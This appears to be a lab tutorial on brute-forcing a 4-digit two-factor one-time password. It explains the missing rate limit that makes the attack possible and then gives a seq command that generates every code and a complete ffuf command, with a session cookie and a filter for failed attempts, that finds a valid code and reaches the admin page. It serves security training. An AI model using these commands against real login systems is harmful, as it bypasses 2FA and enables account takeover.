# Brute-Forcing 2FA Codes

## Overview

Two-factor authentication (2FA) adds a security layer by combining two authentication methods:
- Knowledge-based (password)
- Ownership-based (2FA device)

This makes unauthorized access significantly harder, even with compromised credentials. However, weak implementations can be vulnerable to brute-force attacks.

## Attacking 2FA

### Vulnerability

Many 2FA systems use time-based one-time passwords (TOTP) consisting of digits only. If the code length is short (e.g., 4 digits) and the application lacks rate limiting, all variations can be guessed.

### Example Lab Setup

Given valid credentials (`admin:admin`), the application requires a 4-digit OTP:

```
POST /2fa.php
Parameter: otp
Session: PHPSESSID cookie
```

With only 10,000 possible combinations (0000-9999), brute-forcing is feasible.

### Exploitation Steps

**1. Generate wordlist:**
```bash
seq -w 0 9999 > tokens.txt
```

**2. Brute-force with ffuf:**
```bash
ffuf -w ./tokens.txt \
    -u http://bf_2fa.htb/2fa.php \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
    -d "otp=FUZZ" \
    -fr "Invalid 2FA Code"
```

### Results

The scan returns multiple 302 redirects. The first successful match (e.g., `6513`) is the correct OTP. After submission, the session becomes fully authenticated, granting access to `/admin.php`.
